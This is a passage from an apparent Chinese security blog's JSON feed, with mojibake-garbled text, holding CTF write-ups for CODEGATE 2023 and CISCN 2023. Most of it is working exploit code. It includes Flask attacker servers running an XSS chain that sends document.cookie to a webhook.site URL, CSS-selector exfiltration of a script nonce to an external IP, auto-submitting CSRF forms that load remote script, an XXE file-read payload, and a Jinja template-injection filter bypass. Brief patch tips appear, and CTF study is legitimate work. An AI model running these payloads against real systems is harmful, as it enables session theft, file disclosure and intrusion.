class=\"string\">                const url = &#x27;http://localhost&#x27;</span></span><br><span class=\"line\"><span class=\"string\">                let code = &#x27;&#x27;;</span></span><br><span class=\"line\"><span class=\"string\">                for (let i = 0; i &lt; 15; i++) &#123;</span></span><br><span class=\"line\"><span class=\"string\">                    let resp = await fetch(&#x27;http://3.37.109.189:8080&#x27; + &#x27;/share/read&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">                    let text = await resp.text();</span></span><br><span class=\"line\"><span class=\"string\">                    code += text.match(/nonce-[0-9a-z]+/)?.at(0).replace(&#x27;nonce-&#x27;, &#x27;&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">                &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">                const userId = genNonce();</span></span><br><span class=\"line\"><span class=\"string\">                let extra = open(url + &#x27;/share/read#id=0&amp;username=&#x27; + encodeURIComponent(userId)) // will NOT throw exception if not created</span></span><br><span class=\"line\"><span class=\"string\">                console.log(code);</span></span><br><span class=\"line\"><span class=\"string\">                let resp = await fetch(&#x27;/solve?q=&#x27; + encodeURIComponent(code) + &#x27;&amp;u=&#x27; + encodeURIComponent(userId)); // get predicted nonce from server (with note created)</span></span><br><span class=\"line\"><span class=\"string\">                let text = await resp.text();</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">                setTimeout(()=&gt;&#123;</span></span><br><span class=\"line\"><span class=\"string\">                    extra.location.href = &quot;http://&quot; + location.host + &quot;/solve&quot;;</span></span><br><span class=\"line\"><span class=\"string\">                    setTimeout(()=&gt;&#123;</span></span><br><span class=\"line\"><span class=\"string\">                        extra.history.go(-1); // reload, but with bfcache so that nonce won&#x27;t change, and refresh the `hashchange` event trigger that has been deleted</span></span><br><span class=\"line\"><span class=\"string\">                        setTimeout(()=&gt;&#123;</span></span><br><span class=\"line\"><span class=\"string\">                            extra.location.href = url + &#x27;/share/read#id=0&amp;username=&#x27; + encodeURIComponent(userId)+&#x27;&amp;34sdctycv&#x27;; // trigger `hashchange`</span></span><br><span class=\"line\"><span class=\"string\">                    &#125;,1000)</span></span><br><span class=\"line\"><span class=\"string\">                    &#125;,1000)</span></span><br><span class=\"line\"><span class=\"string\">                &#125;, 1000);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            cc().catch((e)=&gt;&#123;fetch(&#x27;https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/&#x27;+e.toString())&#125;);</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/solve&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sol</span>():</span><br><span class=\"line\">    question = request.form.get(<span class=\"string\">&#x27;q&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> question:</span><br><span class=\"line\">        question = request.args.get(<span class=\"string\">&#x27;q&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> question:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;no question&quot;</span></span><br><span class=\"line\">    ans = solve(question, alphabet, sames_for)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(ans)</span><br><span class=\"line\">    user = request.args.get(<span class=\"string\">&#x27;u&#x27;</span>)</span><br><span class=\"line\">    login(user, user)</span><br><span class=\"line\">    write(<span class=\"string\">&#x27;test&#x27;</span>, <span class=\"string\">f&#x27;&lt;iframe srcdoc=&quot;&lt;script nonce=<span class=\"subst\">&#123;ans[:<span class=\"number\">16</span>]&#125;</span>&gt;fetch(`https://webhook.site/92e3da06-c183-4282-919f-1fb4a8e21437/?a=`+document.cookie)&lt;/script&gt;&quot;&gt;&lt;iframe&gt;&#x27;</span>)</span><br><span class=\"line\">    share()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;hello&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">app.run(<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"number\">5000</span>)</span><br></pre></td></tr></table></figure>\n<p>é™„å®˜æ–¹WPï¼ˆä½¿ç”¨socketè¿›è¡Œé€šä¿¡æŒç»­æ§åˆ¶é¡µé¢ï¼ŒåŸºäºäº‹ä»¶è§¦å‘éœ€è¦çš„æ›´æ–°ï¼Œæ”»å‡»è€…åŠ¨æ€è¿”å›æ‰€éœ€CSSï¼‰:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,request</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_socketio <span class=\"keyword\">import</span> SocketIO</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config[<span class=\"string\">&#x27;SECRET_KEY&#x27;</span>] = <span class=\"string\">&#x27;test1234&#x27;</span></span><br><span class=\"line\">socketio = SocketIO(app,cors_allowed_origins=<span class=\"string\">&quot;*&quot;</span>)</span><br><span class=\"line\">nonce = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">self_url = <span class=\"string\">&quot;http://141.164.55.51:8000/gen_exfil_css?nonce=&quot;</span></span><br><span class=\"line\">s = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@socketio.on(<span class=\"params\"><span class=\"string\">&#x27;start&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">handle_my_custom_event</span>(<span class=\"params\">methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;start&#x27;</span>)</span><br><span class=\"line\">    socketio.emit(<span class=\"string\">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class=\"string\">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;&quot;&lt;html&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;script src=&quot;https://cdn.socket.io/4.3.2/socket.io.min.js&quot; integrity=&quot;sha384-KAZ4DtjNhLChOB/hxXuKqhMLYvx3b5MlT55xPEiNmREKRzeEm+RVPlTnAn0ajQNs&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;script&gt;</span></span><br><span class=\"line\"><span class=\"string\">    var socket</span></span><br><span class=\"line\"><span class=\"string\">    var isRun = 0;</span></span><br><span class=\"line\"><span class=\"string\">    var nonce = &quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    var a,b = undefined;</span></span><br><span class=\"line\"><span class=\"string\">    idx = -1;</span></span><br><span class=\"line\"><span class=\"string\">    function sleep(ms) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        return new Promise((r) =&gt; setTimeout(r, ms));</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">    async function make_shared_note(nonce) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        make_note = window.open(`http://141.164.55.51:8000/gen_exfil_css?nonce=$&#123;nonce&#125;`);</span></span><br><span class=\"line\"><span class=\"string\">        idx = idx + 1;</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.location = `http://localhost/share_diary/$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.close()</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    async function exploit(nonce) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        make_note = window.open(`http://141.164.55.51:8000/exploit?nonce=$&#123;nonce&#125;`);</span></span><br><span class=\"line\"><span class=\"string\">        idx = idx + 1;</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.location = `http://localhost/share_diary/$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">        await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">        make_note.close()</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    function start() &#123;</span></span><br><span class=\"line\"><span class=\"string\">        socket = io.connect(&#x27;http://141.164.55.51:8000&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">        socket.on(&#x27;connect&#x27;, function() &#123;</span></span><br><span class=\"line\"><span class=\"string\">        console.log(&#x27;start&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">        socket.emit( &#x27;start&#x27;, &#123;</span></span><br><span class=\"line\"><span class=\"string\">            data: &#x27;start&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        &#125;)</span></span><br><span class=\"line\"><span class=\"string\">        &#125;)</span></span><br><span class=\"line\"><span class=\"string\">        </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    socket.on(&#x27;nonce&#x27;, async function(data) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        if(!isRun) &#123;</span></span><br><span class=\"line\"><span class=\"string\">        isRun = 1;</span></span><br><span class=\"line\"><span class=\"string\">        if(JSON.parse(data).nonce.length==16)&#123;</span></span><br><span class=\"line\"><span class=\"string\">            await exploit(JSON.parse(data).nonce);</span></span><br><span class=\"line\"><span class=\"string\">            try &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.onload = 1</span></span><br><span class=\"line\"><span class=\"string\">            &#125; catch &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.location = &quot;http://ssrf.kr/redirect_cg.html&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            await sleep(400);</span></span><br><span class=\"line\"><span class=\"string\">            a.location.href = `http://localhost/share/read#id=$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">        else if(nonce &lt;= JSON.parse(data).nonce)&#123;</span></span><br><span class=\"line\"><span class=\"string\">            nonce = JSON.parse(data).nonce</span></span><br><span class=\"line\"><span class=\"string\">            await make_shared_note(nonce);</span></span><br><span class=\"line\"><span class=\"string\">            console.log(nonce);</span></span><br><span class=\"line\"><span class=\"string\">            if(!b) &#123;</span></span><br><span class=\"line\"><span class=\"string\">                b = window.open(&quot;about:blank&quot;)</span></span><br><span class=\"line\"><span class=\"string\">                a = window.open(&quot;http://localhost/share/read&quot;)</span></span><br><span class=\"line\"><span class=\"string\">                await sleep(400)</span></span><br><span class=\"line\"><span class=\"string\">                b.location.href = &quot;http://localhost/share/read&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            try &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.onload = 1</span></span><br><span class=\"line\"><span class=\"string\">            &#125; catch &#123;</span></span><br><span class=\"line\"><span class=\"string\">                a.location = &quot;http://ssrf.kr/redirect_cg.html&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &#125;</span></span><br><span class=\"line\"><span class=\"string\">            await sleep(400);</span></span><br><span class=\"line\"><span class=\"string\">            a.location.href = `http://localhost/share/read#id=$&#123;idx&#125;`</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">            a.focus();</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">        isRun = 0;</span></span><br><span class=\"line\"><span class=\"string\">        &#125; else &#123;</span></span><br><span class=\"line\"><span class=\"string\">        &#125;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;);</span></span><br><span class=\"line\"><span class=\"string\">    &#125;</span></span><br><span class=\"line\"><span class=\"string\">    chall_url = &quot;http://localhost/&quot;</span></span><br><span class=\"line\"><span class=\"string\">    start();</span></span><br><span class=\"line\"><span class=\"string\">&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;/html&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/exploit&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">    nonce = request.args.get(<span class=\"string\">&#x27;nonce&#x27;</span>)</span><br><span class=\"line\">    payload = <span class=\"string\">f&quot;&quot;&quot;&lt;iframe srcdoc=&quot;&lt;script nonce=<span class=\"subst\">&#123;nonce&#125;</span> src=//ssrf.kr/ex.js&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">f&quot;&quot;&quot;&lt;body onload=&quot;form.submit()&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=&#x27;form&#x27; action=&quot;http://localhost/write&quot;, method=&quot;POST&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;exploit&quot;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;content&quot; value=&#x27;<span class=\"subst\">&#123;payload&#125;</span>&#x27;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/gen_exfil_css&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">css</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> nonce</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(nonce)&lt;=<span class=\"built_in\">len</span>(request.args.get(<span class=\"string\">&#x27;nonce&#x27;</span>)):</span><br><span class=\"line\">        nonce = request.args.get(<span class=\"string\">&#x27;nonce&#x27;</span>)</span><br><span class=\"line\">        app.logger.info(nonce)</span><br><span class=\"line\">        rules = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">            rules.append(</span><br><span class=\"line\">                <span class=\"string\">&quot;&quot;&quot;script[nonce^=&quot;&#123;nonce&#125;&#123;c&#125;&quot;] &#123;&#123; background-image: url(&#123;self_url&#125;&#123;ce&#125;) !important&#125;&#125;&quot;&quot;&quot;</span>.<span class=\"built_in\">format</span>(</span><br><span class=\"line\">                    nonce=nonce, self_url=self_url, c=c, ce=nonce+ urllib.parse.quote(c)</span><br><span class=\"line\">                )</span><br><span class=\"line\">            )</span><br><span class=\"line\">        rules_str = <span class=\"string\">&quot;\\n&quot;</span>.join(rules)</span><br><span class=\"line\">        payload = <span class=\"string\">&quot;&quot;&quot;&lt;style&gt;* &#123;&#123; display: block !important; &#125;&#125;&#123;rules_str&#125;&lt;/style&gt;&quot;&quot;&quot;</span>.<span class=\"built_in\">format</span>(rules_str=rules_str)</span><br><span class=\"line\">        socketio.emit(<span class=\"string\">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class=\"string\">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">f&quot;&quot;&quot;&lt;body onload=&quot;form.submit()&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=&#x27;form&#x27; action=&quot;http://localhost/write&quot;, method=&quot;POST&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;exploit&quot;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;content&quot; value=&#x27;<span class=\"subst\">&#123;payload&#125;</span>&#x27;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        socketio.emit(<span class=\"string\">&#x27;nonce&#x27;</span>, json.dumps(&#123;<span class=\"string\">&quot;nonce&quot;</span>:nonce&#125;))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;asdf&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    socketio.run(app, host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>,port=<span class=\"number\">8000</span> ,debug=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ä¹å­\"><a href=\"#ä¹å­\" class=\"headerlink\" title=\"ä¹å­\"></a>ä¹å­</h3><p>å¾ˆå¤šé˜Ÿéƒ½æ˜¯ä½¿ç”¨éšæœºæ•°é¢„æµ‹ç›´æ¥ç ´çš„ã€‚ä¸»åŠæ–¹è¡¨ç¤ºï¼š<br><img src=\"/2023/08/29/CODEGATE2023/lezi.png\" alt=\"notcrypto\" loading=\"lazy\"></p>\n<h2 id=\"0day\"><a href=\"#0day\" class=\"headerlink\" title=\"0day\"></a>0day</h2><p>åˆ©ç”¨è·¯å¾„ç©¿è¶Šå†™maildevçš„lib&#x2F;router.jså¢åŠ è‡ªå®šä¹‰è·¯ç”±ã€‚<br>è°ƒç”¨ï¼šæŠŠæœåŠ¡æ‰“æŒ‚ï¼ˆä¾‹å¦‚è¯•å›¾å†™&#x2F;flagæˆ–è€…&#x2F;etc&#x2F;passwdä»€ä¹ˆçš„ï¼‰ï¼Œé‡å¯çš„æ—¶å€™å°±ä¼šåŠ è½½ã€‚  </p>\n",
            "tags": [
                "Write-Up"
            ]
        },
        {
            "id": "http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/",
            "url": "http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/",
            "title": "CISCN 2023 Write-Up & Tricks",
            "date_published": "2023-07-06T16:28:12.000Z",
            "content_html": "<h1 id=\"CISCN-2023-éƒ¨åˆ†-Write-Up-åŠpatchå¦™å¦™å°æŠ€å·§\"><a href=\"#CISCN-2023-éƒ¨åˆ†-Write-Up-åŠpatchå¦™å¦™å°æŠ€å·§\" class=\"headerlink\" title=\"CISCN 2023 éƒ¨åˆ† Write-Up åŠpatchå¦™å¦™å°æŠ€å·§\"></a>CISCN 2023 éƒ¨åˆ† Write-Up åŠpatchå¦™å¦™å°æŠ€å·§</h1><h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><p>å˜é‡è¦†ç›–+XXEå¤–éƒ¨å®ä½“æ³¨å…¥ä»»æ„æ–‡ä»¶è¯»ã€‚<br>Patchï¼šä¿®äº†extractå°±è¡Œ<br>exp:  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">file = <span class=\"string\">&quot;/flag&quot;</span></span><br><span class=\"line\">username = <span class=\"string\">&quot;okok20&quot;</span></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">f&quot;&quot;&quot;<span class=\"subst\">&#123;username&#125;</span>&quot;&quot;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;password&#x27;</span>: <span class=\"string\">f&quot;&quot;&quot;y&quot;&quot;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;user_xml_format&#x27;</span>: <span class=\"string\">f&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY content SYSTEM &quot;php://filter/read=convert.base64-encode/resource=<span class=\"subst\">&#123;file&#125;</span>&quot;&gt;]&gt;&lt;userinfo&gt;&lt;user&gt;&lt;username&gt;&amp;content;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;&lt;/userinfo&gt;&quot;&quot;&quot;</span>,</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r = requests.post(<span class=\"string\">&quot;http://175.20.20.196/register.php&quot;</span>,data=data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br><span class=\"line\">r = requests.get(<span class=\"string\">f&quot;http://175.20.20.196/login.php?username=<span class=\"subst\">&#123;username&#125;</span>&amp;password=2&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n<h3 id=\"Ciscn-Search-Engine\"><a href=\"#Ciscn-Search-Engine\" class=\"headerlink\" title=\"Ciscn_Search_Engine\"></a>Ciscn_Search_Engine</h3><p>Jinjaæ¨¡æ¿æ³¨å…¥ï¼Œç»•è¿‡æ»¤å­—ç¬¦ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨requestè°ƒç”¨getå‚æ•°æ¥ç»•è¿‡å„ç§å­—ç¬¦ã€‚   </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;()|attr(request.values.name1)|attr(request.values.name2)|attr(request.values.name3)()|attr(request.values.name4)(40)(request.values.name6)|attr(request.values.name5)()&#125;&#125;</span><br><span class=\"line\">post:</span><br><span class=\"line\">name1=__class__&amp;name2=__base__&amp;name3=__subclasses__&amp;name4=pop&amp;name5=read&amp;name6=&quot;/flag&quot;</span><br></pre></td></tr></table></figure>\n<p>Patchï¼šæŠŠèŠ±æ‹¬å·å¹²äº†ã€‚  </p>\n<h3 id=\"å…¶ä»–ä¸ƒä¸ƒå…«å…«çš„Patch\"><a href=\"#å…¶ä»–ä¸ƒä¸ƒå…«å…«çš„Patch\" class=\"headerlink\" title=\"å…¶ä»–ä¸ƒä¸ƒå…«å…«çš„Patch\"></a>å…¶ä»–ä¸ƒä¸ƒå…«å…«çš„Patch</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ˜¯å¯ä»¥çŸ¥é“Patchå¤±è´¥çš„åŸå› çš„ï¼Œé‚£ä¹ˆä¸€å®šè¦ç¡®ä¿ä¸è¦Patchè¿‡çŒ›å¯¼è‡´æœåŠ¡å¼‚å¸¸ï¼›æˆ‘ä»¬éœ€è¦<strong>ä¼˜å…ˆç¡®ä¿æœåŠ¡æ­£å¸¸å·¥ä½œï¼Œé€æ­¥åŠ å¤§PatchåŠ›åº¦</strong>ã€‚</p>\n<h4 id=\"è¿‡æ»¤å…³é”®å­—\"><a href=\"#è¿‡æ»¤å…³é”®å­—\" class=\"headerlink\" title=\"è¿‡æ»¤å…³é”®å­—\"></a>è¿‡æ»¤å…³é”®å­—</h4><p>æ— 